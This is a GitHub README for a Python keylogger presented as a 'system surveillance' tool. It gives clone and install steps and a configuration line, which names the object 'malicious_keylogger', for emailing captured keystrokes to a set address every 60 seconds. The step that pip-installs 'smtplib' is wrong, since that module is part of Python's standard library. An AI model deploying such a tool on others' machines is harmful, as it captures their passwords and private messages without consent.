# System Surveillance using Keylogger

![Python](https://img.shields.io/badge/Language-Python-blue)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

## About

This repository contains a Python script for a system surveillance tool using a keylogger. The keylogger captures keystrokes and logs them to a file for monitoring purposes.

## Features

- Keylogging functionality to record keystrokes
- Email notification system for immediate alerts
- Designed and implemented entirely in Python
- Provides insights into unauthorized system usage
- Enhances system security and identifies potential threats

## Installation

1. Clone the repository:
    ```bash
    git clone https://github.com/amanmaner011/System-Surveillance-using-Keylogger.git
    ```
2. Navigate to the project directory:
    ```bash
    cd System-Surveillance-using-Keylogger/src
    ```
3. Install the required dependencies:
    ```bash
    pip install pynput smtplib
    ```

## Usage

1. Open `src/execute_keylogger.py` and update the email and password fields:
    ```python
    malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'your-email@gmail.com', 'your-email-password')
    ```
2. To start the keylogger, run the following command:
    ```bash
    python src/execute_keylogger.py
    ```
3. The keylogger will start recording keystrokes and send email notifications as configured.
